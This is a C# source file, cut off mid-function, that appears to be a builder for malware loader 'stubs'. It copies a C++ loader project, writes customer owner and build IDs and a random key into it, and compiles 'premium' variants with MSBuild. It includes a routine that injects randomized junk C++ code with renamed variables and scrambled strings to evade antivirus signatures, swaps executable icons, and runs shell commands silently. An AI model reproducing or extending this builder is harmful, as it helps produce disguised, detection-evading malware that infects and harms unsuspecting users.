using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Security;
using System.Runtime.Remoting.Contexts;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using Vestris.ResourceLib;

public class HexGenerator
{
    private static readonly Random random = new Random();

    public static string GetRandomHex()
    {
        int length = random.Next(3, 7); // 3 to 6 digits
        int maxValue = (int)Math.Pow(16, length) - 1;
        int value = random.Next(0, maxValue + 1);

        return "0x" + value.ToString("X").PadLeft(length, '0');
    }
}

class Program
{

    static bool UrlIsValid(string url)
    {
        try
        {
            HttpWebRequest request = HttpWebRequest.Create(url) as HttpWebRequest;
            request.Timeout = 2000; //set the timeout to 5 seconds to keep the user from waiting too long for the page to load
            request.Method = "HEAD"; //Get only the header information -- no need to download any content

            using (HttpWebResponse response = request.GetResponse() as HttpWebResponse)
            {
                int statusCode = (int)response.StatusCode;
                if (statusCode >= 100 && statusCode < 400) //Good requests
                {
                    return true;
                }
                else if (statusCode >= 500 && statusCode <= 510) //Server Errors
                {
                    //log.Warn(String.Format("The remote server has thrown an internal error. Url is not valid: {0}", url));
                    return false;
                }
            }
        }
        catch (WebException ex)
        {
            if (ex.Status == WebExceptionStatus.ProtocolError) //400 errors
            {
                return false;
            }
            else
            {
            }
        }
        catch (Exception ex)
        {
        }
        return false;
    }

    public static string ExecuteCommandCMD(string command)
    {
        try
        {
            // Create a new process start info
            ProcessStartInfo procStartInfo = new ProcessStartInfo("cmd.exe", "/c " + command)
            {
                RedirectStandardError = true,
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            // Create a process and assign the start info
            using (Process proc = new Process())
            {
                proc.StartInfo = procStartInfo;
                proc.Start();

                // Wait for the process to exit
                proc.WaitForExit();

                // Read the output and error streams
                string output = proc.StandardOutput.ReadToEnd();
                string error = proc.StandardError.ReadToEnd();

                // Return the output or error
                if (!string.IsNullOrEmpty(output))
                {
                    return output;
                }
                else if (!string.IsNullOrEmpty(error))
                {
                    return "Error: " + error;
                }
                else
                {
                    return "No output or error.";
                }
            }
        }
        catch (Exception ex)
        {
            return "Exception: " + ex.Message;
        }
    }
    public static string ExecuteCommand(string ex, string args)
    {

        ProcessStartInfo procStartInfo = new ProcessStartInfo(ex, args)
        {
            RedirectStandardError = true,
            RedirectStandardOutput = true,
            UseShellExecute = false,
            CreateNoWindow = false
        };

        using (Process proc = new Process())
        {
            proc.StartInfo = procStartInfo;
            proc.Start();

            string output = proc.StandardOutput.ReadToEnd();

            if (string.IsNullOrEmpty(output))
                output = proc.StandardError.ReadToEnd();

            return output;
        }

    }


    private static Random randomAMAQ = new Random();
    public static string xxasdffds3(int length)
    {
        const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        return new string(Enumerable.Repeat(chars, length)
          .Select(s => s[randomAMAQ.Next(s.Length)]).ToArray());
    }

    static string GetRandomURLA()
    {

        List<string> stringListuq = new List<string>
        {
            "https://raw.githubusercontent.com/VinieClara/FN-Manfiestes/main/SdkVersion.txt"
        };


        if (stringListuq == null || stringListuq.Count == 0)
        {
            throw new ArgumentException("The list of strings is null or empty.");
        }

        Random muratrandom = new Random();
        int randomIndexmurat = muratrandom.Next(0, stringListuq.Count);
        return stringListuq[randomIndexmurat];
    }


    static void CopyDirectory(string sourceDir, string destDir)
    {
        DirectoryInfo dir = new DirectoryInfo(sourceDir);

        if (!dir.Exists)
        {
            throw new DirectoryNotFoundException($"Source directory does not exist or could not be found: {sourceDir}");
        }

        DirectoryInfo[] dirs = dir.GetDirectories();
        Directory.CreateDirectory(destDir);

        FileInfo[] files = dir.GetFiles();
        foreach (FileInfo file in files)
        {
            string tempPath = Path.Combine(destDir, file.Name);
            file.CopyTo(tempPath, false);
        }

        foreach (DirectoryInfo subdir in dirs)
        {
            string tempPath = Path.Combine(destDir, subdir.Name);
            CopyDirectory(subdir.FullName, tempPath);
        }
    }

    static void ChangeExeIcon(string icoPath, string exePath)
    {
        try
        {
            if (!File.Exists(icoPath))
            {
                Console.WriteLine($"Icon file '{icoPath}' does not exist.");
                return;
            }

            if (!File.Exists(exePath))
            {
                Console.WriteLine($"Executable file '{exePath}' does not exist.");
                return;
            }

            // Load the executable file
            var iconFile = new IconFile(icoPath);
            var iconDirectoryResource = new IconDirectoryResource(iconFile);

            // Replace the icon in the executable
            iconDirectoryResource.SaveTo(exePath);

            Console.WriteLine("Icon successfully changed.");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error: {ex.Message}");
        }
    }

    static void DeleteFolder(string folderPath)
    {
        try
        {
            if (Directory.Exists(folderPath))
            {
                Directory.Delete(folderPath, true);
                Console.WriteLine($"The folder '{folderPath}' and all its contents have been deleted.");
            }
            else
            {
                Console.WriteLine($"The folder '{folderPath}' does not exist.");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error: {ex.Message}");
        }
    }
    static void ReplaceTextInFile(string filePath, string searchText, string replaceText)
    {
        if (!File.Exists(filePath))
        {
            throw new FileNotFoundException($"File not found: {filePath}");
        }

        string content = File.ReadAllText(filePath);
        content = content.Replace(searchText, replaceText);
        File.WriteAllText(filePath, content);
    }
    static bool ContainsPREInLast6(string str)
    {
        if (str.Length < 6)
            return false;

        string last6 = str.Substring(str.Length - 6);
        return last6.Contains("PRE");
    }
    static string GetRandomNumberBIG()
    {
        Random random = new Random();
        int randomNumber = random.Next(1000000, 9999999);
        return randomNumber.ToString();
    }

    static string GetRandomNumberSMOL()
    {
        Random randomsm = new Random();
        int randomNumbersm = randomsm.Next(250, 2800);
        return randomNumbersm.ToString();
    }

    static void ReplaceFakeCode(string filePath)
    {
        List<string> replacements = new List<string>
        {
            "char randBuf[32];\nHCRYPTPROV hCryptProv;\nCryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);\nCryptGenRandom(hCryptProv, 32, reinterpret_cast<BYTE*>(randBuf));\nint checkSum = 0;\nfor (int j = 0; j < 32; j += 2) {\n    checkSum += (randBuf[j] * randBuf[j + 1]) ^ j;\n}\nCryptReleaseContext(hCryptProv, 0);\nstd::cout << \"Checksum: \" << checkSum << \"\\n\";",
            "MEMORYSTATUSEX memStatus;\nmemStatus.dwLength = sizeof(memStatus);\nGlobalMemoryStatusEx(&memStatus);\nDWORDLONG totalMem = memStatus.ullTotalPhys;\nDWORDLONG availMem = memStatus.ullAvailPhys;\nfor (int i = 0; i < 5; i++) {\n    totalMem = _rotl64(totalMem, i) ^ availMem;\n}\ntotalMem %= 8192;\nstd::cout << \"Memory calc: \" << totalMem << \"\\n\";",
            "std::string encode = \"DeadCode_\" + std::to_string(std::rand() % 100);\nchar key = static_cast<char>(GetTickCount() % 128);\nfor (size_t i = 0; i < encode.length(); i++) {\n    encode[i] ^= (key + i);\n    key = static_cast<char>((key * 3 + i) % 256);\n}\nfor (size_t j = 0; j < encode.length() / 2; j++) {\n    encode[j] += encode[encode.length() - 1 - j] ^ key;\n}\nstd::cout << \"Encoded: \" << encode << \"\\n\";",
            "HWND hwndList[5] = {nullptr};\nint count = 0;\nfor (int i = 0; i < 8 && count < 5; i++) {\n    hwndList[count] = FindWindowExA(nullptr, hwndList[count > 0 ? count - 1 : 0], nullptr, nullptr);\n    if (hwndList[count] && IsWindowVisible(hwndList[count])) count++;\n}\nBOOL isValid = count > 0 ? IsWindow(hwndList[0]) : FALSE;\nstd::cout << \"Valid windows: \" << count << \", First valid: \" << isValid << \"\\n\";",
            "int data[12];\nint* p = data;\nsrand(GetTickCount());\nfor (int i = 0; i < 12; i++) {\n    *(p + i) = ((i * 13) ^ rand()) % 31;\n}\nint offset = 0;\nfor (int j = 0; j < 6; j++) {\n    offset += (*(p + j) * j) - *(p + 11 - j);\n}\nstd::cout << \"Offset: \" << offset << \"\\n\";",
            "char titles[3][10] = {\"AlphaX\", \"BetaY\", \"GammaZ\"};\nDWORD pid = GetCurrentProcessId();\nfor (int i = 0; i < 3; i++) {\n    titles[i][5] = static_cast<char>('0' + (pid % 10));\n    SetConsoleTitleA(titles[i]);\n    Sleep(1 + (pid % 3));\n}\nSetConsoleTitleA(std::to_string(pid % 100).c_str());\nDWORD tick = GetTickCount() % 25;\nstd::cout << \"Tick: \" << tick << \"\\n\";",
            "int grid[5][5];\nfor (int i = 0; i < 5; i++) {\n    for (int j = 0; j < 5; j++) {\n        grid[i][j] = ((i * j) << 3) ^ (i + j);\n    }\n}\nint flatSum = 0;\nfor (int k = 0; k < 25; k++) {\n    flatSum += grid[k / 5][k % 5] * (k + 1) % 64;\n}\nstd::cout << \"Grid sum: \" << flatSum << \"\\n\";",
            "FILETIME ft;\nSYSTEMTIME st;\nGetSystemTimeAsFileTime(&ft);\nFileTimeToSystemTime(&ft, &st);\nst.wHour = (st.wHour + (GetTickCount() % 5)) % 24;\nst.wMinute ^= (st.wSecond >> 1);\nst.wSecond += st.wMilliseconds % 10;\nSystemTimeToFileTime(&st, &ft);\nDWORD low = ft.dwLowDateTime % 1500;\nstd::cout << \"Low time: \" << low << \"\\n\";",
            "float angles[8];\nDWORD seed = GetTickCount();\nsrand(seed);\nfor (int i = 0; i < 8; i++) {\n    angles[i] = cos(static_cast<float>(i + (rand() % 5)) / 3.0f);\n}\nfloat total = 0.0f;\nfor (int j = 0; j < 8; j++) {\n    total += angles[j] * tan(angles[(j + rand() % 4) % 8]);\n}\nstd::cout << \"Angle total: \" << total << \"\\n\";",
            "DWORD freqSum = 0;\nfor (int freq = 200; freq < 260; freq += 7) {\n    Beep(freq + (GetTickCount() % 10), 3 + (freq % 4));\n    freqSum += (freq * (freq % 13)) % 60;\n}\nstd::cout << \"Freq sum: \" << freqSum << \"\\n\";",
            "int matrix[3][3] = {{1, 2, 3}, {4, 5, 6}, {7, 8, 9}};\nsrand(GetCurrentThreadId());\nfor (int i = 0; i < 3; i++) for (int j = 0; j < 3; j++) matrix[i][j] += rand() % 5;\nint det = 0;\nfor (int i = 0; i < 3; i++) {\n    det += matrix[0][i] * (matrix[1][(i + 1) % 3] * matrix[2][(i + 2) % 3] - matrix[1][(i + 2) % 3] * matrix[2][(i + 1) % 3]);\n}\ndet %= 150;\nstd::cout << \"Det: \" << det << \"\\n\";",
            "char buffer[20] = \"Delta1_Obf\";\nDWORD tick = GetTickCount();\nfor (int i = 0; i < 19; i++) {\n    buffer[i] ^= (buffer[i + 1] + (tick % 7));\n    buffer[i] = _rotl8(buffer[i], i % 4);\n}\nstd::string temp(buffer);\nfor (char& c : temp) c = (c << 2) % 127;\nstd::cout << \"Temp: \" << temp << \"\\n\";",
            "POINT p;\nGetCursorPos(&p);\nint x = p.x ^ (GetTickCount() % 100);\nint y = p.y;\nfor (int i = 0; i < 5; i++) {\n    x = (x * 5 + i) % 2560;\n    y = (y ^ (x >> i)) % 1440;\n}\np.x = x + (y << 1);\nstd::cout << \"Cursor calc: \" << p.x << \"\\n\";",
            "int* ptr = new int[15];\nDWORD seed = GetCurrentThreadId();\nsrand(seed);\nfor (int i = 0; i < 15; i++) {\n    ptr[i] = ((i * 17) ^ rand()) % 59;\n}\nint product = 1;\nfor (int j = 0; j < 15; j += 2) {\n    product *= (ptr[j] + ptr[j + 1]) % 100;\n}\nstd::cout << \"Product: \" << product << \"\\n\";\ndelete[] ptr;",
            "SYSTEMTIME st;\nGetSystemTime(&st);\nunsigned int fakeHash = (st.wSecond * 1000 + st.wMilliseconds) ^ st.wHour;\nfor (int i = 0; i < 6; i++) {\n    fakeHash = _rotl(fakeHash, i) ^ (st.wMinute + i);\n}\nDWORD tick = GetTickCount();\nfakeHash += (tick % 150);\nstd::cout << \"Fake hash: \" << fakeHash << \"\\n\";",
            "std::string dummyStr = \"Calc_\" + std::to_string(GetTickCount() % 100);\nfloat angle = 0.0f;\nfor (size_t i = 0; i < dummyStr.length(); i++) {\n    angle += sin(static_cast<float>(dummyStr[i] % 15) / 2.0f);\n    dummyStr[i] ^= ((i + 1) % 5);\n}\ndouble result = angle * 3.14159 * cos(angle);\nstd::cout << \"Result: \" << result << \"\\n\";",
            "HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);\nCONSOLE_SCREEN_BUFFER_INFO csbi;\nGetConsoleScreenBufferInfo(hConsole, &csbi);\nshort origCols = csbi.dwSize.X;\nshort origRows = csbi.dwSize.Y;\ncsbi.dwSize.X += (GetTickCount() % 5);\nSetConsoleScreenBufferSize(hConsole, csbi.dwSize);\nSleep(2);\ncsbi.dwSize.X = origCols;\ncsbi.dwSize.Y += (rand() % 3);\nSetConsoleScreenBufferSize(hConsole, csbi.dwSize);\nSleep(1);\ncsbi.dwSize.Y = origRows;\nSetConsoleScreenBufferSize(hConsole, csbi.dwSize);",
            "int tempArr[10];\nDWORD seed = GetCurrentProcessId();\nsrand(seed);\nfor (int i = 0; i < 10; i++) {\n    tempArr[i] = ((i << 4) ^ (rand() + i)) % 31;\n}\nint sum = 0;\nfor (int j = 0; j < 10; j++) {\n    sum += tempArr[j] * (j + 2) ^ (sum >> 1);\n}\nstd::cout << \"Array sum: \" << sum << \"\\n\";",
            "int noiseArr[16];\nsrand(static_cast<unsigned>(GetCurrentProcessId() ^ GetTickCount()));\nfor (int i = 0; i < 16; i++) {\n    noiseArr[i] = (rand() ^ (i << 2)) % 73;\n}\nint noiseSum = 0;\nfor (int j = 0; j < 16; j += 3) {\n    noiseSum += noiseArr[j] * noiseArr[(j + 1) % 16] - noiseArr[(j + 2) % 16];\n}\nstd::cout << \"Noise sum: \" << noiseSum << \"\\n\";",
            "char obfuscate[24] = \"HiddenText1234567890\";\nDWORD tickShift = GetTickCount();\nfor (int i = 0; i < 23; i++) {\n    obfuscate[i] ^= (tickShift % 13) + obfuscate[i + 1];\n    obfuscate[i] = _rotr8(obfuscate[i], (i % 3) + 1);\n}\nstd::string obfStr(obfuscate);\nfor (size_t k = 0; k < obfStr.length(); k++) {\n    obfStr[k] += (k % 7);\n}\nstd::cout << \"Obfuscated: \" << obfStr << \"\\n\";",
            "float wave[10];\nDWORD waveSeed = GetCurrentThreadId();\nsrand(waveSeed);\nfor (int i = 0; i < 10; i++) {\n    wave[i] = sin(static_cast<float>(rand() % 20) / 4.0f) + cos(static_cast<float>(i) / 2.0f);\n}\nfloat waveSum = 0.0f;\nfor (int j = 0; j < 10; j++) {\n    waveSum += wave[j] * wave[(j + 3) % 10];\n}\nstd::cout << \"Wave sum: \" << waveSum << \"\\n\";",
            "int lattice[4][4];\nfor (int i = 0; i < 4; i++) {\n    for (int j = 0; j < 4; j++) {\n        lattice[i][j] = ((i ^ j) << 4) + (GetTickCount() % 17);\n    }\n}\nint latticeProd = 1;\nfor (int k = 0; k < 16; k++) {\n    latticeProd *= lattice[k / 4][k % 4] % 41;\n}\nstd::cout << \"Lattice prod: \" << latticeProd << \"\\n\";",
            "SYSTEMTIME sysTime;\nGetLocalTime(&sysTime);\nDWORD timeHash = sysTime.wDay * 1440 + sysTime.wHour * 60 + sysTime.wMinute;\nfor (int i = 0; i < 5; i++) {\n    timeHash ^= (timeHash << i) + sysTime.wMilliseconds;\n}\ntimeHash %= 10000;\nstd::cout << \"Time hash: \" << timeHash << \"\\n\";",
            "char soundSeq[16];\nsrand(GetTickCount());\nfor (int i = 0; i < 16; i++) {\n    soundSeq[i] = static_cast<char>((rand() % 50) + 65);\n}\nint soundSum = 0;\nfor (int j = 0; j < 16; j += 4) {\n    Beep(soundSeq[j] * 10, 2);\n    soundSum += soundSeq[j] ^ soundSeq[j + 1];\n}\nstd::cout << \"Sound sum: \" << soundSum << \"\\n\";",
            "int* dynArr = new int[20];\nsrand(GetCurrentProcessId());\nfor (int i = 0; i < 20; i++) {\n    dynArr[i] = (rand() * i) % 97;\n}\nint dynSum = 0;\nfor (int j = 0; j < 20; j += 2) {\n    dynSum += (dynArr[j] << 1) - dynArr[j + 1];\n}\nstd::cout << \"Dynamic sum: \" << dynSum << \"\\n\";\ndelete[] dynArr;",
            "CONSOLE_CURSOR_INFO cci;\nHANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);\nGetConsoleCursorInfo(hOut, &cci);\ncci.dwSize = (cci.dwSize + (GetTickCount() % 10)) % 100;\nSetConsoleCursorInfo(hOut, &cci);\nSleep(1);\ncci.dwSize = 25;\nSetConsoleCursorInfo(hOut, &cci);\nDWORD cursorTick = GetTickCount() % 50;\nstd::cout << \"Cursor tick: \" << cursorTick << \"\\n\";",
            "std::string twist = \"Twist_\" + std::to_string(GetCurrentThreadId() % 100);\nchar twistKey = static_cast<char>(rand() % 64 + 32);\nfor (size_t i = 0; i < twist.length(); i++) {\n    twist[i] ^= twistKey + (i % 3);\n    twistKey = static_cast<char>((twistKey << 1) % 128);\n}\nfor (size_t j = 0; j < twist.length(); j++) {\n    twist[j] += twist[(j + 1) % twist.length()];\n}\nstd::cout << \"Twisted: \" << twist << \"\\n\";",
            "int scramble[8];\nDWORD scramSeed = GetTickCount() ^ GetCurrentProcessId();\nsrand(scramSeed);\nfor (int i = 0; i < 8; i++) {\n    scramble[i] = (rand() ^ (i << 3)) % 43;\n}\nint scramSum = 0;\nfor (int j = 0; j < 8; j++) {\n    scramSum += scramble[j] * (scramble[(j + 2) % 8] >> 1);\n}\nstd::cout << \"Scramble sum: \" << scramSum << \"\\n\";",
            "FILETIME ftRand;\nGetSystemTimeAsFileTime(&ftRand);\nDWORD randLow = ftRand.dwLowDateTime;\nDWORD randHigh = ftRand.dwHighDateTime;\nfor (int i = 0; i < 4; i++) {\n    randLow ^= (randHigh >> i) + (GetTickCount() % 11);\n    randHigh = _rotl(randHigh, i);\n}\nrandLow %= 2000;\nstd::cout << \"Random low: \" << randLow << \"\\n\";",
            "int matrix4[4][4];\nsrand(GetCurrentThreadId());\nfor (int i = 0; i < 4; i++) {\n    for (int j = 0; j < 4; j++) {\n        matrix4[i][j] = (rand() % 10) + (i * j);\n    }\n}\nint trace = 0;\nfor (int k = 0; k < 4; k++) {\n    trace += matrix4[k][k] * (matrix4[(k + 1) % 4][(k + 1) % 4] % 7);\n}\nstd::cout << \"Matrix trace: \" << trace << \"\\n\";",
            "char noiseStr[32];\nsrand(GetTickCount());\nfor (int i = 0; i < 32; i++) {\n    noiseStr[i] = static_cast<char>((rand() % 95) + 32);\n}\nint noiseHash = 0;\nfor (int j = 0; j < 32; j += 2) {\n    noiseHash += (noiseStr[j] ^ noiseStr[j + 1]) * (j + 1);\n}\nstd::cout << \"Noise hash: \" << noiseHash << \"\\n\";",
            "POINT cursorShift;\nGetCursorPos(&cursorShift);\nint shiftX = cursorShift.x;\nint shiftY = cursorShift.y;\nfor (int i = 0; i < 6; i++) {\n    shiftX = (shiftX + (GetTickCount() % 13)) % 1920;\n    shiftY ^= (shiftX << i) % 1080;\n}\ncursorShift.x = shiftX - shiftY;\nstd::cout << \"Shifted X: \" << cursorShift.x << \"\\n\";",
            "int* fluxArr = new int[12];\nsrand(GetCurrentProcessId() ^ GetTickCount());\nfor (int i = 0; i < 12; i++) {\n    fluxArr[i] = ((i << 2) + rand()) % 67;\n}\nint fluxProd = 1;\nfor (int j = 0; j < 12; j += 3) {\n    fluxProd *= fluxArr[j] ^ fluxArr[(j + 1) % 12];\n}\nstd::cout << \"Flux prod: \" << fluxProd << \"\\n\";\ndelete[] fluxArr;",
            "SYSTEMTIME stShift;\nGetSystemTime(&stShift);\nDWORD shiftVal = stShift.wMinute * 60 + stShift.wSecond;\nfor (int i = 0; i < 5; i++) {\n    shiftVal = (shiftVal << i) ^ (stShift.wMilliseconds + i);\n}\nshiftVal %= 5000;\nstd::cout << \"Shift val: \" << shiftVal << \"\\n\";",
            "float sinWave[6];\nsrand(GetCurrentThreadId());\nfor (int i = 0; i < 6; i++) {\n    sinWave[i] = sin(static_cast<float>(rand() % 10) / 3.0f);\n}\nfloat waveMix = 0.0f;\nfor (int j = 0; j < 6; j++) {\n    waveMix += sinWave[j] * cos(sinWave[(j + 2) % 6]);\n}\nstd::cout << \"Wave mix: \" << waveMix << \"\\n\";",
            "char titleMix[15] = \"MixTitle_123\";\nDWORD pidMix = GetCurrentProcessId();\nfor (int i = 0; i < 3; i++) {\n    titleMix[i + 9] = static_cast<char>('0' + (pidMix % 10));\n    SetConsoleTitleA(titleMix);\n    pidMix /= 10;\n    Sleep(1);\n}\nSetConsoleTitleA(\"Console\");\nstd::cout << \"Title mix done\\n\";",
            "int grid3[3][3];\nsrand(GetTickCount());\nfor (int i = 0; i < 3; i++) {\n    for (int j = 0; j < 3; j++) {\n        grid3[i][j] = (rand() % 15) ^ (i + j);\n    }\n}\nint gridSum = 0;\nfor (int k = 0; k < 9; k++) {\n    gridSum += grid3[k / 3][k % 3] * (k % 4 + 1);\n}\nstd::cout << \"Grid3 sum: \" << gridSum << \"\\n\";",
            "DWORD beepCycle = 150;\nfor (int i = 0; i < 5; i++) {\n    Beep(beepCycle + (GetTickCount() % 20), 4 + (i % 3));\n    beepCycle += (rand() % 10);\n}\nDWORD cycleSum = beepCycle * (GetTickCount() % 7);\nstd::cout << \"Cycle sum: \" << cycleSum << \"\\n\";",
            "int* rotArr = new int[14];\nsrand(GetCurrentProcessId());\nfor (int i = 0; i < 14; i++) {\n    rotArr[i] = _rotl(i * 11, i % 4) % 53;\n}\nint rotSum = 0;\nfor (int j = 0; j < 14; j += 2) {\n    rotSum += rotArr[j] ^ (rotArr[j + 1] >> 1);\n}\nstd::cout << \"Rot sum: \" << rotSum << \"\\n\";\ndelete[] rotArr;",
            "std::string fluxStr = \"Flux_\" + std::to_string(GetTickCount() % 1000);\nchar fluxKey = static_cast<char>(GetCurrentThreadId() % 128);\nfor (size_t i = 0; i < fluxStr.length(); i++) {\n    fluxStr[i] ^= (fluxKey + i) % 64;\n    fluxKey = static_cast<char>((fluxKey * 5) % 256);\n}\nfor (size_t j = 0; j < fluxStr.length() / 2; j++) {\n    fluxStr[j] -= fluxStr[fluxStr.length() - 1 - j];\n}\nstd::cout << \"Flux str: \" << fluxStr << \"\\n\";",
            "MEMORY_BASIC_INFORMATION mbi;\nVirtualQuery(GetCurrentProcess(), &mbi, sizeof(mbi));\nSIZE_T baseAddr = reinterpret_cast<SIZE_T>(mbi.BaseAddress);\nfor (int i = 0; i < 5; i++) {\n    baseAddr = (baseAddr >> i) ^ (GetTickCount() + i);\n}\nbaseAddr %= 32768;\nstd::cout << \"Base addr: \" << baseAddr << \"\\n\";",
            "int polyArr[10];\nsrand(GetCurrentThreadId() ^ GetTickCount());\nfor (int i = 0; i < 10; i++) {\n    polyArr[i] = ((rand() << 2) ^ i) % 89;\n}\nint polySum = 0;\nfor (int j = 0; j < 10; j += 2) {\n    polySum += polyArr[j] * polyArr[j + 1] - (polySum % 5);\n}\nstd::cout << \"Poly sum: \" << polySum << \"\\n\";",
            "char mixBuf[20] = \"MixBuffer98765432\";\nDWORD mixTick = GetTickCount();\nfor (int i = 0; i < 19; i++) {\n    mixBuf[i] ^= mixBuf[i + 1] + (mixTick % 9);\n    mixBuf[i] = _rotl8(mixBuf[i], (i % 5));\n}\nstd::string mixStr(mixBuf);\nfor (char& c : mixStr) {\n    c = (c + (GetTickCount() % 3)) % 127;\n}\nstd::cout << \"Mix str: \" << mixStr << \"\\n\";",
            "SYSTEMTIME stMix;\nGetLocalTime(&stMix);\nDWORD mixHash = stMix.wHour * 3600 + stMix.wMinute * 60 + stMix.wSecond;\nfor (int i = 0; i < 4; i++) {\n    mixHash ^= (mixHash >> i) + (stMix.wDay << i);\n}\nmixHash %= 7500;\nstd::cout << \"Mix hash: \" << mixHash << \"\\n\";",
            "float polyWave[8];\nsrand(GetTickCount());\nfor (int i = 0; i < 8; i++) {\n    polyWave[i] = cos(static_cast<float>(rand() % 15) / 2.0f) * sin(static_cast<float>(i));\n}\nfloat polyMix = 0.0f;\nfor (int j = 0; j < 8; j++) {\n    polyMix += polyWave[j] * polyWave[(j + 1) % 8];\n}\nstd::cout << \"Poly mix: \" << polyMix << \"\\n\";",
            "int* chaosArr = new int[18];\nsrand(GetCurrentProcessId());\nfor (int i = 0; i < 18; i++) {\n    chaosArr[i] = (rand() ^ (i << 3)) % 61;\n}\nint chaosSum = 0;\nfor (int j = 0; j < 18; j += 3) {\n    chaosSum += chaosArr[j] * (chaosArr[(j + 2) % 18] >> 2);\n}\nstd::cout << \"Chaos sum: \" << chaosSum << \"\\n\";\ndelete[] chaosArr;"
        };

        Random random = new Random();
        string text = File.ReadAllText(filePath);

        // Replace each /*FAKE CODE*/ with a randomized C++ snippet
        text = Regex.Replace(text, @"/\*FAKE CODE\*/", match =>
        {
            string selectedCode = replacements[random.Next(replacements.Count)];
            return RandomizeCodeBlock(selectedCode, random);
        });

        File.WriteAllText(filePath, text);
    }

    static string RandomizeCodeBlock(string code, Random random)
    {
        // Generate random suffix for variable names
        string GenerateRandomSuffix() => random.Next(1000, 9999).ToString() + RandomString(3, random);

        // Generate random alphanumeric string
        string RandomString(int length, Random rand)
        {
            const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            char[] result = new char[length];
            for (int i = 0; i < length; i++) result[i] = chars[rand.Next(chars.Length)];
            return new string(result);
        }

        // Dictionary to track variable name replacements
        Dictionary<string, string> varReplacements = new Dictionary<string, string>();

        // Common variable names to replace (excluding keywords and types)
        string[] variableNames = { "randBuf", "hCryptProv", "checkSum", "j", "memStatus", "totalMem", "availMem", "i",
            "encode", "key", "hwndList", "count", "isValid", "data", "p", "offset", "titles", "pid", "tick", "grid",
            "flatSum", "seed", "total", "freqSum", "freq", "matrix", "det", "buffer",
            "temp", "ptr", "product", "fakeHash", "dummyStr", "angle", "result", "hConsole", "csbi", "origCols",
            "origRows", "tempArr", "sum", "noiseArr", "noiseSum", "obfuscate", "tickShift", "obfStr", "wave", "waveSeed",
            "waveSum", "lattice", "latticeProd", "sysTime", "timeHash", "soundSeq", "soundSum", "dynArr", "dynSum", "cci",
            "hOut", "cursorTick", "twist", "twistKey", "scramble", "scramSeed", "scramSum", "ftRand", "randLow", "randHigh",
            "matrix4", "trace", "noiseStr", "noiseHash", "cursorShift", "shiftX", "shiftY", "fluxArr", "fluxProd", "stShift",
            "shiftVal", "sinWave", "waveMix", "titleMix", "pidMix", "grid3", "gridSum", "beepCycle", "cycleSum", "rotArr",
            "rotSum", "fluxStr", "fluxKey", "mbi", "baseAddr", "polyArr", "polySum", "mixBuf", "mixTick", "mixStr", "stMix",
            "mixHash", "polyWave", "polyMix", "chaosArr", "chaosSum" };

        // Replace variable names
        foreach (string var in variableNames)
        {
            if (!varReplacements.ContainsKey(var))
            {
                varReplacements[var] = var + GenerateRandomSuffix();
            }
            code = Regex.Replace(code, $@"\b{var}\b", varReplacements[var]);
        }

        // Randomize string literals (only those in quotes, not format specifiers like "\n")
        code = Regex.Replace(code, @"\""([^\""]+)\""", match =>
        {
            string originalString = match.Groups[1].Value;
            if (originalString == "\\n") return match.Value; // Skip newline
            return "\"" + RandomString(originalString.Length, random) + "\"";
        });

        return code;
    }

    public static string GetUserAvatar(string userId)
    {
        var client = new WebClient();
        client.Headers.Add("Authorization", "Bot " + "??");
        var json = client.DownloadString("https://discord.com/api/v9/users/" + userId);
        var obj = JObject.Parse(json);
        var id = obj["id"].ToString();
        var avatar = obj["avatar"].ToString();
        var ext = avatar.StartsWith("a_") ? "gif" : "png";
        return $"https://cdn.discordapp.com/avatars/{id}/{avatar}.{ext}";
    }

    public static string domene = "x";
    static void BuildStub(Object parameters)
    {
        Console.WriteLine("Building Stub");

        try
        {
            dynamic pars = parameters;
            string Owd = pars.oib;
            string Bwd = pars.bkey;
            string Exnm = pars.exnam;
            string Icnd = pars.icn;
            string iconsave = "messi";



            // C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\MSBuild\Current\Bin
            // D:\VisualStudio\Community\MSBuild\Current\Bin\MSBuild.exe
            // C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin

            string msbuildPath = @"C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe";

            string FolderTMP = xxasdffds3(16);
            string TMPCopy = Directory.GetCurrentDirectory() + "\\Builds\\" + FolderTMP;

            string contents;



            if (ContainsPREInLast6(Bwd))
            {
                Console.WriteLine("Compiling premium stub");


                CopyDirectory(Directory.GetCurrentDirectory() + "\\LoaderPRE", TMPCopy);

                Thread.Sleep(150);

                ReplaceTextInFile(Directory.GetCurrentDirectory() + "\\Builds\\" + FolderTMP + "\\Ecy.h", "OMGHERE", HexGenerator.GetRandomHex());
                Thread.Sleep(20);
                ReplaceTextInFile(Directory.GetCurrentDirectory() + "\\Builds\\" + FolderTMP + "\\Loader.cpp", "//OWNERID", Owd);
                Thread.Sleep(20);
                ReplaceTextInFile(Directory.GetCurrentDirectory() + "\\Builds\\" + FolderTMP + "\\Loader.cpp", "//BUILDID", Bwd);
                Thread.Sleep(20);

                //ReplaceFakeCode(Directory.GetCurrentDirectory() + "\\Builds\\" + FolderTMP + "\\Loader.cpp");

                string projectPath = Directory.GetCurrentDirectory() + "\\Builds\\" + FolderTMP + "\\LoaderPRE.vcxproj";
                string arguments = $"\"{projectPath}\" /p:Configuration=Release /p:Platform=x64";

                ExecuteCommand(msbuildPath, arguments);

                Thread.Sleep(12000);

